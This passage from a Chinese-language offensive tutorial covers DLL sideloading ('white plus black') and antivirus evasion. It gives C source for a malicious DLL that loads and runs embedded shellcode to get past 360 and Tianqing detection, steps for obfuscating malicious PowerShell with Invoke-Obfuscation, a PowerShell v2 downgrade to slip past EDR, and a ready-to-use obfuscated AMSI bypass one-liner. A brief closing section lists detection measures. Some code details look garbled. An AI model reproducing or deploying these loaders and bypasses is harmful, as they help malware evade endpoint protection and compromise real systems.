时，可能会劫持DllMain中的控制流。执行此操作时，没有必要枚举和满足所有需要的导出，即可能存在 DLL 没有任何导出并且只能通过 DllMain
入口点被劫持的情况。
##### 白执行DLL加载shellcode
我们也可以通过构造恶意的黑DLL，并在其中运行shellcode，达到命令执行的效果，来绕过360和天擎的检测。
黑DLL加载shellcode的代码演示（如下图所示）：
    /*
    DLL执行DLL的命令
    编译64位（Linux）：i686_64-w64-mingw32-gcc -shared -o xxx.dll xxx.c
    */
    #include 
    #include 
    #include 
    // 加载的shellcoder（弹calc） 64-bit
    unsigned char payload[] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x0, 0x0, 0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0xf, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x1, 0xd0, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x1, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9,  };
    extern "A" __declspec(dllexport) void Go(void) {
        void * exec_mem;
        BOOL rv;
        HANDLE th;
        DWORD oldprotect = 0;
        unsigned int payload_len = sizeof(payload);
        exec_mem = VirtualAlloc(1, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        RtlMoveMemory(exec_mem, payload, payload_len);
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }
    BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ulreason_forcall, LPVOID lpReserved) {
        switch (ul_reason_for_call)  {
        case DLL_PROCESS_ATTACH:
            break;
        }
        return TRUE;
    }
#### 0X03无文件落地
* * *
##### 内存（asmi）/行为（edr）检测
我们知道一旦启用Powershell，就会导致微软的Defender调用ASMI接口，进行检测。但是我们要注意，其实在启动Powershell的时候，asmi.exe就已经被注入到powershell.exe的进程当中了，所以Defender才可以通过ASMI的函数去检测恶意行为。又因为某些原因Powershell无文件落地免杀在国内其实不太流行，因为360\天擎一旦发现Powershell运行一些敏感函数就会标记直接拦截，导致执行失败，但是它却可绕过火绒等杀软。
###### Powershell混淆
Invoke-Obfuscation是一个兼容PowerShellv2.0+的PowerShell命令和脚本混淆器（github地址：
>   1. 第一步将涉及创建恶意PowerShell脚本并将其保存，沙箱检测如下所示：
>
>
> 
>
>   2. 创建并保存恶意PowerShell脚本后，打开混淆工具，我们可以通过在Invoke-Obfuscate提示符中运行以下命令来完成：
>  
>     >     Import-Module .\Invoke-Obfuscation.psd1
>     Invoke-Obfuscation
>  
>
>
> 
>
>   3. 然后指定脚本路径，系统将提示您使用混淆方法菜单，如下所示：
>  
>     >     set scriptpath xxxx.ps1
>  
>
>
> 
>
>   4. 这时，我们可以选择合适混淆方法，通过在Invoke-Obfuscate提示符中运行命令来选择此选项：
>  
>     >     token
>     all
>  
>
>
> 
>
>
>
>   1. 最后，输出混淆后的.ps1脚本
>
>  
>  
>     1
>     out xxx.ps1
>  
>
>
> 
>
> 我们已经能够成功地混淆我们的恶意PowerShell脚本并逃避任何AV检测，或者您也可以使用Invoke-> Obfuscate来混淆或编码单个PowerShell命令。建议有能力的进行二次开发，除去加密的特征值，免杀效果更好。
注意：使用的目标应该能够执行PowerShell脚本，否则，我们将无法执行混淆/编码的PowerShell脚本。
当然也可以利用
###### 绕过EDR
为了防止我们被edr发现，我们需要针对Powershell进行"降低版本"的操作，如果你有能力降级到 Powershell
2.0，这可以让你绕过该ConstrainedLanguage模式。虽然效果不错，但是如果edr对版本进行标记，依然会导致异常。
    $ExecutionContext.SessionState.LanguageMode
    Powershell
    $ExecutionContext.SessionState.LanguageMode
    Powershell -version 2
小提示：Win10及以上版本可能需要安装Powershell 2版本才可以进行利用！
##### ASMI免杀处理
为了做好Powershell的免杀，我们针对内存规避有着以下的手段：
> 专注于内存操作，不将文件写入磁盘
>
> 通过利用各种Windows API将有效负载注入进程
>
> 然后在存储器中的单独线程中执行有效载荷
但是ASMI依然对Powershell的免杀有着致命的打击，所以需要我们针对Powershell的ASMI免杀做出特定的研究。
###### 利用常见方法绕过
> 使用XOR等加密方法来绕过AMSI，并在运行时将字符串解码回内存
>
> 通过阻断ASMI.dll中AmsiScanBuffer()函数的扫描进程
>
> 修改注册表，将HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable的值更改为0
###### 利用网站混淆绕过
    #Matt Graebers second Reflection method 
    $wfSi=$null;$hlrajhy="$([char](30+53)+[cHaR]([byte]0x79)+[CHar]([BYtE]0x73)+[ChAR]([BYTe]0x74)+[Char](101*20/20)+[chaR](109*46/46)).$([CHaR](65+12)+[chAR](97+89-89)+[CHAR]([byTE]0x6e)+[cHAR]([bYte]0x61)+[char]([ByTe]0x67)+[ChAR](101)+[CHAR]([byTe]0x6d)+[cHaR]([bytE]0x65)+[chAr]([ByTe]0x6e)+[cHar](116)).$(('Ãutômát'+'íón').NOrmAlizE([chaR](33+37)+[cHAR](111)+[ChAR]([BYTE]0x72)+[CHAr](109+28-28)+[CHar](68)) -replace [chaR](92+71-71)+[cHar]([BYTe]0x70)+[ChAr]([Byte]0x7b)+[ChaR]([BYtE]0x4d)+[chaR]([BYtE]0x6e)+[ChaR](125+53-53)).$(('Âms'+'íUt'+'íls').NORMaLIze([cHAr](70)+[cHAR]([BYTE]0x6f)+[cHAr](24+90)+[chAR](22+87)+[cHar](68+36-36)) -replace [cHAR]([bYTe]0x5c)+[Char](112+50-50)+[chAr]([bYtE]0x7b)+[CHar](77)+[cHAr]([byTE]0x6e)+[CHar]([BYTe]0x7d))";$xrgohuphpvm="+('n'+'u'+'ã').NormALize([CHaR](70+47-47)+[ChaR](111)+[cHaR]([BYtE]0x72)+[cHAR]([ByTe]0x6d)+[CHAR](68*53/53)) -replace [CHAr]([BYTE]0x5c)+[chAr]([bYte]0x70)+[ChAr]([BYTe]0x7b)+[chaR](77)+[cHaR](110+87-87)+[chAR](125*25/25)";[Threading.Thread]::Sleep(1085);[Runtime.InteropServices.Marshal]::("$([cHAR]([ByTe]0x57)+[char](114)+[Char]([byte]0x69)+[ChAR](116)+[chAR]([byte]0x65)+[ChAR](73+49-49)+[chAr](110+78-78)+[chAR]([BYte]0x74)+[CHar]([BYTE]0x33)+[cHAR](50*13/13))")([Ref].Assembly.GetType($hlrajhy).GetField("$(('àmsìC'+'ôntex'+'t').norMAlizE([CHAR]([BYte]0x46)+[ChAr]([BYtE]0x6f)+[Char](114+75-75)+[CHAr]([ByTE]0x6d)+[CHaR]([byTE]0x44)) -replace [CHar]([BYtE]0x5c)+[cHar](112+67-67)+[CHaR](123+7-7)+[CHar]([BYTE]0x4d)+[ChAR]([byTe]0x6e)+[ChAR]([bYtE]0x7d))",[Reflection.BindingFlags]"NonPublic,Static").GetValue($wfSi),0x5762f72c);
网站链接：
#### 0X04寻找白文件
* * *
##### 人工寻找白文件
通过Procmon进程监视器，显示实时⽂件系统、注册表和进程/线程活动，这⾥我们⽤来观察进程运⾏过程的DLL调⽤。通过设置不同的筛选方式去寻找可以加载的黑DLL。
我们通过运⾏xxx.exe白文件对比，寻找是否存在LoadLibrary函数，如果存在，我们可以直接构造一个恶意黑DLL。
反之，我们就需要劫持不存在的DLL。
##### 自动化挖掘白文件
* * *
    DLLSpy.exe -x
    -d：强制，扫描加载的模块。
    -o：指定输出文件。
    -s：静态扫描，寻找缺失的DLL和二进制文件中的DLL
    -r ：递归扫描，number是递归的深度
    执行：python DllJacking_Python.py 目标文件夹地址
虽然高效，误报高，准确度低！
也可以去网站搜索 （网站地址：
#### 0X05检测和预防措施
* * *
我也收集了关于白加黑的部分预防和检测方法，并分享在下文当中。该分享将白加黑攻击分解为软件开发级别的预防措施，并提出了针对端点用户级别的建议。如上提及的一些检测方法：
> 检查具有异常网络连接的进程，且给定进程的网络活动已变得与基线不同，则该进程可能已受到损害
>
> DLL权限，针对具有LoadLibrary()函数的DLL进行限制
>
> DLL白名单，即跟踪系统上使用的DLL的哈希值以识别差异
但是这些检测方法难以大范围实施，虽然可以利用，但是成本过于高昂。这就是为什么"白加黑"仍然有效并在攻防演练当中运用的原因。该恶意攻击方式存在的根本问题与软件开发人员密切相关。所以希望本文能被更多开发人员看见，已减少攻击者用其攻击手段。
参考文章如下：
> 
>
>  black-basta-ransomware/>
>
> 
>
> 